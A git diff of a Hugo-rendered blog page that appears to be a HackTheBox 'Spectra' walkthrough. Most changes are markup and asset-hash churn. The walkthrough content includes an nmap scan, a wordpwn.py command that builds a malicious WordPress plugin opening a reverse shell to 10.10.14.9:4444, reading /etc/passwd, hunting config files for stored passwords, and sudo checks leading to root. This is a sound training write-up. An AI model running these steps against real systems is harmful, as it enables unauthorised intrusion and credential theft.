@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.83.1" /><meta name="theme-color" content="#fff" />
+    <meta name="generator" content="Hugo 0.118.2"><meta name="theme-color" content="#fff" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -14,11 +14,11 @@
 
     <title>Spectra Writeup (HackTheBox) | Doomdesire</title>
 
-    <link rel="stylesheet" href="/css/meme.min.47b7defd9dcca4589f4d279a79d656a7d334f973be4a3a4f1893fd20fc857df5.css"/>
+    <link rel="stylesheet" href="/css/meme.min.353693cdab7615152d304004b0e93d7af7fc743668040b9951ebb05d714ac96f.css"/>
 
     
     
-        <script src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js" defer></script><script src="/js/meme.min.a74e28464a7eeed54b4e02aead6360ae76bbd5ee5745afdf0a47319b6541600e.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js" defer></script><script src="/js/meme.min.07eb0af6b6ace5741d44ee2fa3e3defd0fe88ef104f8c52f4ee23b1e0fe0b06d.js"></script>
 
     
 
@@ -288,7 +288,7 @@ Spectra is an easy ChromeOS machine on HackTheBox created by egre55 (https://www
 <p>We can start with the standard nmap, scanning the default ports:</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -311,28 +311,28 @@ Spectra is an easy ChromeOS machine on HackTheBox created by egre55 (https://www
 </span><span class="lnt">21
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">nmap -sC -sV 10.10.10.229 -oN spectra.nmap
-Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-23 15:16 EDT
-Nmap scan report <span class="k">for</span> 10.10.10.229
-Host is up <span class="o">(</span>0.081s latency<span class="o">)</span>.
-Not shown: <span class="m">997</span> closed ports
-PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 8.1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
-<span class="p">|</span> ssh-hostkey: 
-<span class="p">|</span>_  <span class="m">4096</span> 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a <span class="o">(</span>RSA<span class="o">)</span>
-80/tcp   open  http    nginx 1.17.4
-<span class="p">|</span>_http-server-header: nginx/1.17.4
-<span class="p">|</span>_http-title: Site doesn<span class="err">&#39;</span>t have a title <span class="o">(</span>text/html<span class="o">)</span>.
-3306/tcp open  mysql   MySQL <span class="o">(</span>unauthorized<span class="o">)</span>
-<span class="p">|</span>_ssl-cert: ERROR: Script execution failed <span class="o">(</span>use -d to debug<span class="o">)</span>
-<span class="p">|</span>_ssl-date: ERROR: Script execution failed <span class="o">(</span>use -d to debug<span class="o">)</span>
-<span class="p">|</span>_sslv2: ERROR: Script execution failed <span class="o">(</span>use -d to debug<span class="o">)</span>
-<span class="p">|</span>_tls-alpn: ERROR: Script execution failed <span class="o">(</span>use -d to debug<span class="o">)</span>
-<span class="p">|</span>_tls-nextprotoneg: ERROR: Script execution failed <span class="o">(</span>use -d to debug<span class="o">)</span>
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 41.19 seconds
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -sC -sV 10.10.10.229 -oN spectra.nmap
+</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-23 15:16 EDT
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.229
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.081s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">997</span> closed ports
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh     OpenSSH 8.1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">4096</span> 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp   open  http    nginx 1.17.4
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.17.4
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Site doesn<span class="err">&#39;</span>t have a title <span class="o">(</span>text/html<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">3306/tcp open  mysql   MySQL <span class="o">(</span>unauthorized<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-cert: ERROR: Script execution failed <span class="o">(</span>use -d to debug<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: ERROR: Script execution failed <span class="o">(</span>use -d to debug<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_sslv2: ERROR: Script execution failed <span class="o">(</span>use -d to debug<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_tls-alpn: ERROR: Script execution failed <span class="o">(</span>use -d to debug<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_tls-nextprotoneg: ERROR: Script execution failed <span class="o">(</span>use -d to debug<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 41.19 seconds
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><h3 id="flags-used"><a href="#flags-used" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>Flags used:</h3>
 <ul>
@@ -378,7 +378,7 @@ Note that Instead of viewing the page source we could also use <code>curl http:/
 <img src="https://netuserdoomdesire.github.io/Spectra/11.png" alt="Pasted image 20210624164217.png">
 Some instant information we can get is that Wordpress is out-of-date and that our version is <strong>5.4.2</strong>. Of course we could have known this right from the start by looking for example at the page source of the login page:
 <img src="https://netuserdoomdesire.github.io/Spectra/12.png" alt="Pasted image 20210624163938.png">
-or by using the firefox extension &ldquo;<strong>Wappalyzer</strong>&quot;:
+or by using the firefox extension &ldquo;<strong>Wappalyzer</strong>&rdquo;:
 <img src="https://netuserdoomdesire.github.io/Spectra/13.png" alt="Pasted image 20210624164029.png">
 The version can also be found by the previously mentioned <strong>wpscan</strong> tool.</p>
 <hr>
@@ -387,13 +387,13 @@ The version can also be found by the previously mentioned <strong>wpscan</strong
 It&rsquo;s usage is pretty straightforward. We are gonna run:</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">chmod +x wordpwn.py
-./wordpwn.py 10.10.14.9 <span class="m">4444</span> Y
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">chmod +x wordpwn.py
+</span></span><span class="line"><span class="cl">./wordpwn.py 10.10.14.9 <span class="m">4444</span> Y
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>This will first make the script executable, then create file called &ldquo;<strong>malicious.zip</strong>&rdquo; that is our vulnerable plugin that we are gonna upload. The plugin is gonna get us a reverse shell on port 4444 that we declared. The <code>Y</code> option declares that we want to automatically start a handler with metasploit:
 <img src="https://netuserdoomdesire.github.io/Spectra/15.png" alt="Pasted image 20210624170131.png">
@@ -411,30 +411,30 @@ As our handler is waiting to receive a connection, we upload our malicious plugi
 <p>At first glance we can see there is another user on the box named Katie:</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">cat /etc/passwd <span class="p">|</span> grep <span class="s2">&#34;/bin/bash&#34;</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat /etc/passwd <span class="p">|</span> grep <span class="s2">&#34;/bin/bash&#34;</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p><img src="https://netuserdoomdesire.github.io/Spectra/18.png" alt="Pasted image 20210624171438.png">
 If we want to get the <strong>user.txt</strong> we have to escalate our privileges to that user. If we are going to avoid automated tools such as <strong>LinPeas</strong>, manually searching for configuration files is one of the most standard ways to find possible user credentials, so we can search by typing:</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">find / -name *.conf* 2&gt; /dev/null
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">find / -name *.conf* 2&gt; /dev/null
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>This will search for all files on the system that contain the <strong>.conf</strong> part on their name. However running this will create a lot of noise from some folders such as <strong>/etc</strong>, <strong>/mnt</strong> and <strong>/usr</strong> so we can begin by filtering them out of our command to have a more manageable output. If we find nothing after filtering them out we will start looking there too.  To filter them out we run:</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">find / -name *.conf* 2&gt; /dev/null <span class="p">|</span> grep -v -e <span class="s2">&#34;/etc/&#34;</span> -e <span class="s2">&#34;/mnt/&#34;</span> -e <span class="s2">&#34;/usr&#34;</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">find / -name *.conf* 2&gt; /dev/null <span class="p">|</span> grep -v -e <span class="s2">&#34;/etc/&#34;</span> -e <span class="s2">&#34;/mnt/&#34;</span> -e <span class="s2">&#34;/usr&#34;</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p><img src="https://netuserdoomdesire.github.io/Spectra/20.png" alt="Pasted image 20210624172845.png">
 We notice a file named <strong>/opt/autologin.conf.orig</strong>. Reading it, we see there is a password file on a folder named <strong>autologin</strong> inside <strong>/etc</strong>. Remember that we filtered out this folder! We could have easily missed it!
@@ -448,11 +448,11 @@ The possible users to try logging in with this password are root and Katie. Ther
 <p>Since we are logged in as a proper user, we can now look to gain root privileges. Again, if we are going to avoid an automated tool such as <strong>LinPeas</strong>, we want to manually search for common vulnerabilities. One of them, is granting users the ability to run all or some binaries as the root user. We can check what Katie can run as root by typing:</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">sudo -l
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo -l
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>This will list all the binaries Katie can run with sudo:
 <img src="https://netuserdoomdesire.github.io/Spectra/24.png" alt="Pasted image 20210624174625.png">
@@ -500,7 +500,7 @@ We are root!</p>
 
         
     <div class="updated-badge-container">
-        <span title="Updated @ 2021-06-26 19:03:12 EEST" style="cursor:help">
+        <span title="Updated @ 2021-06-26 19:03:12 &#43;03" style="cursor:help">
 
 <svg xmlns="http://www.w3.org/2000/svg" width="130" height="20" class="updated-badge"><linearGradient id="b" x2="0" y2="100%"><stop offset="0" stop-color="#bbb" stop-opacity=".1"/><stop offset="1" stop-opacity=".1"/></linearGradient><clipPath id="a"><rect width="130" height="20" rx="3" fill="#fff"/></clipPath><g clip-path="url(#a)"><path class="updated-badge-left" d="M0 0h55v20H0z"/><path class="updated-badge-right" d="M55 0h75v20H55z"/><path fill="url(#b)" d="M0 0h130v20H0z"/></g><g fill="#fff" text-anchor="middle" font-size="110"><text x="285" y="150" fill="#010101" fill-opacity=".3" textLength="450" transform="scale(.1)">updated</text><text x="285" y="140" textLength="450" transform="scale(.1)">updated</text><text x="915" y="150" fill="#010101" fill-opacity=".3" textLength="650" transform="scale(.1)">2021-06-26</text><text x="915" y="140" textLength="650" transform="scale(.1)">2021-06-26</text></g></svg>
         </span></div>
@@ -650,7 +650,7 @@ We are root!</p>
             
     <footer id="footer" class="footer">
         <div class="footer-inner">
-            <div class="site-info">©&nbsp;2021–2021&nbsp;<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon footer-icon"><path d="M462.3 62.6C407.5 15.9 326 24.3 275.7 76.2L256 96.5l-19.7-20.3C186.1 24.3 104.5 15.9 49.7 62.6c-62.8 53.6-66.1 149.8-9.9 207.9l193.5 199.8c12.5 12.9 32.8 12.9 45.3 0l193.5-199.8c56.3-58.1 53-154.3-9.8-207.9z"/></svg>&nbsp;Doomdesire</div><div class="site-copyright"></div>
+            <div class="site-info">©&nbsp;2021–2023&nbsp;<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon footer-icon"><path d="M462.3 62.6C407.5 15.9 326 24.3 275.7 76.2L256 96.5l-19.7-20.3C186.1 24.3 104.5 15.9 49.7 62.6c-62.8 53.6-66.1 149.8-9.9 207.9l193.5 199.8c12.5 12.9 32.8 12.9 45.3 0l193.5-199.8c56.3-58.1 53-154.3-9.8-207.9z"/></svg>&nbsp;Doomdesire</div><div class="site-copyright"></div>
 
             
     
